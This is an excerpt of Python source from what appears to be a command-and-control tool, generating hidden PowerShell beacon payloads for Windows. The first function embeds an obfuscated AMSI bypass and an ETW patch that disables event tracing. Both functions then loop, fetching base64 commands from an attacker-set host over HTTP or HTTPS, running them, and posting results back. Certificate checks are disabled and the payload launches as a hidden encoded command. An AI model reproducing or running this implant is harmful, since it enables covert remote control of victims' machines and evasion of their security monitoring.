    pages = ["admin.php","upload.php","maintainence.php","background.php","painters.php", "backup.php"]
    # obfuscated header keys
    hdrs = {"X-Session-ID": [88,45,83,101,115,115,105,111,110,45,73,68], "X-API-KEY": [88,45,65,80,73,45,75,69,89], "X-Forward-Key": [88,45,70,111,114,119,97,114,100,45,75,101,121]}

    hdr_keys = ["X-Session-ID", "X-API-KEY", "X-Forward-Key"]
    pages_literal = ", ".join(f"'{p}'" for p in pages)
    hdr_keys_literal  = ", ".join(f"'{h}'" for h in hdr_keys)


    # build the raw PowerShell one-liner
    ps_lines = (
    "Function G-SID {",
    "    $c = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();",
    "    $p = @();",
    "    1..3 | % { $p += -join(1..5 | % { $c | Get-Random }) };",
    "    $p -join '-'",
    "}",
    "$sid = G-SID;",
    "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();",

    # AMSI bypass
    "$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
    "(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
    "$n='Non'+'Public';$s='Static';"
    "$f=$e.GetField(([string]::Join('',[char[]]"
    "(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
    "$t=[type[]]@([object],[bool]);"
    "$m=$f.GetType().GetMethod('Set'+'Value',$t);"
    "$m.Invoke($f,@($null,$true));"

    # ETW bypass
    "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Win{"
    "[DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string s);"
    "[DllImport(\"kernel32.dll\")] public static extern IntPtr GetProcAddress(IntPtr m, string p);"
    "[DllImport(\"kernel32.dll\")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o); }';"
    "$k=([char[]](107,101,114,110,101,108,51,50,46,100,108,108)-join'');"
    "$n=([char[]](110,116,100,108,108,46,100,108,108)-join'');"
    "$v=([char[]](86,105,114,116,117,97,108,80,114,111,116,101,99,116)-join'');"
    "$e=([char[]](69,116,119,69,118,101,110,116,87,114,105,116,101)-join'');"
    "$mod=[Win]::LoadLibrary($k);$vp=[Win]::GetProcAddress($mod,$v);"
    "$ntbase=([System.Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName -eq $n}).BaseAddress;"
    "$peOff=$ntbase.ToInt64()+0x3C;$pe=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$peOff);"
    "$etblOff=$ntbase.ToInt64()+$pe+0x88;"
    "$expt=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]$etblOff);"
    "$exptVA=$ntbase.ToInt64()+$expt;"
    "$fnCount=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x18));"
    "$fnNamesRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exptVA+0x20));"
    "$fnNamesVA=$ntbase.ToInt64()+$fnNamesRVA;"
    "$etwptr=0;for($i=0;$i-lt$fnCount;$i++){"
    "$nameRVA=[System.Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($fnNamesVA+($i*4)));"
    "$namePtr=($ntbase.ToInt64()+$nameRVA);"
    "$currName=\"\";for($j=0;($c=[System.Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($namePtr),$j))-ne 0;$j++){$currName+=[char]$c};"
    "if($currName-eq$e){$etwptr=$namePtr;break}};"
    "$etwAddr=[IntPtr]$etwptr;"
    "$null=[Win]::VirtualProtect($etwAddr,[UIntPtr]::op_Explicit(1),0x40,[ref]([uint32]0));"
    "[System.Runtime.InteropServices.Marshal]::WriteByte($etwAddr,0xC3);"

    f"$pages = @({pages_literal});",
    f"$hdrArr = @({hdr_keys_literal});",

    "while ($true) {",
    "    $page   = $pages | Get-Random;",
    "    $hdrKey = $hdrArr | Get-Random;",
    f"    $uri    = 'http://{ip}:{port}/' + $page;",
    "$req  = [System.Net.HttpWebRequest]::Create($uri);",
    "    $req.Method    = 'GET';",
    "    $req.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';",
    "    $req.Accept    = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';",
    "    $req.Headers.Add('Accept-Language','en-US,en;q=0.5');",
    "    $req.Headers.Add('Accept-Encoding','gzip, deflate');",
    "    $req.Headers.Add($hdrKey, $sid);",
    "    $resp   = $req.GetResponse();",
    "    $stream = $resp.GetResponseStream();",
    "    $reader = New-Object System.IO.StreamReader($stream);",
    "    $taskJson = $reader.ReadToEnd();",
    "    $reader.Close(); $stream.Close(); $resp.Close();",

    # ← replaced reflection with built-ins:
    "    $task    = $taskJson | ConvertFrom-Json;",
    "    $cmdB64  = $task.cmd;",

    "    $cmd     = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmdB64));",
    "    $pw      = [Management.Automation.PowerShell]::Create();",
    "    $pw.AddScript($cmd) | Out-Null;",
    "    $res     = $pw.Invoke() | Out-String;",
    "    $b64out  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($res.Trim()));",

    "$req2  = [System.Net.HttpWebRequest]::Create($uri);",
    "    $req2.Method    = 'POST';",
    "    $req2.ContentType   = 'application/json';",
    "    $req2.UserAgent     = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0';",
    "    $req2.Headers.Add('Accept-Language','en-US,en;q=0.5');",
    "    $req2.Headers.Add('Accept-Encoding','gzip, deflate');",
    "    $hdrKey2 = $hdrArr | Get-Random;",
    "    $req2.Headers.Add($hdrKey2, $sid);",

    "    $bodyDict = @{ output = $b64out };",
    "    $bodyJson = $bodyDict | ConvertTo-Json -Compress;",

    "    $buf     = [Text.Encoding]::UTF8.GetBytes($bodyJson);",
    "    $req2.ContentLength = $buf.Length;",
    "    $stream2 = $req2.GetRequestStream(); $stream2.Write($buf,0,$buf.Length); $stream2.Close();",
    "    $resp2   = $req2.GetResponse(); $resp2.Close();",

    f"    Start-Sleep -Seconds {beacon_interval};",
    "}",
)

    # finally encode for PowerShell
    raw_ps = "\n".join(ps_lines)
    encoded = base64.b64encode(raw_ps.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    return final_cmd


def generate_windows_powershell_https(ip, port, beacon_interval, obs, no_child=None):
    beacon_url = f"https://{ip}:{port}/"
    interval = beacon_interval

    raw = (
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = "
        "{ $true };"
        f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
        f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
        f"$sid=G-SID;$uri='{beacon_url}';"
        "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
        "$hdr=@{'X-Session-ID'=$sid};"

        # Define Get-Task
        "Function Get-Task {"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'GET';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        "$resp = $req.GetResponse();"
        "$stream = $resp.GetResponseStream();"
        "$reader = New-Object System.IO.StreamReader($stream);"
        "$result = $reader.ReadToEnd();"
        "$reader.Close();$stream.Close();$resp.Close();"
        "return $result"
        "};"

        # Define Send-Output
        "Function Send-Output($payload) {"
        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'POST';"
        "$req.ContentType = 'application/json';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        "$req.ContentLength = $bytes.Length;"
        "$stream = $req.GetRequestStream();"
        "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
        "$resp = $req.GetResponse();$resp.Close()"
        "};"

        # Init PS pipeline
        "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
        "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
        "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

        # Beacon loop
        "while($true){"
        "try{"
        "$taskJson = Get-Task;"
        "$task = ConvertFrom-Json $taskJson;"
        "if($task.cmd){"
        "$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.cmd));"
        "$pipeline.Commands.Clear();"
        "$pipeline.AddScript($cmd)|Out-Null;"
        "$results = $pipeline.Invoke();"
        "$output = $results|Out-String;"
        "$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
        "$body = @{output=$b64}|ConvertTo-Json;"
        "Send-Output $body;"
        "}"
        "}catch{};"
        f"Start-Sleep -Seconds {interval};"
        "}"
    )

    encoded = base64.b64encode(raw.encode('utf-16le')).decode()
    if not no_child:
        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"

    else:
        final_cmd = encoded

    if obs is None or obs == 0:
        if no_child:
            return final_cmd

        pyperclip.copy(final_cmd)
        print(brightyellow + final_cmd)
        print(brightgreen + "[+] Payload copied to clipboard")
        return final_cmd

    else:
        print(brightred + f"[*] Obfuscation for HTTPS payloads not yet available")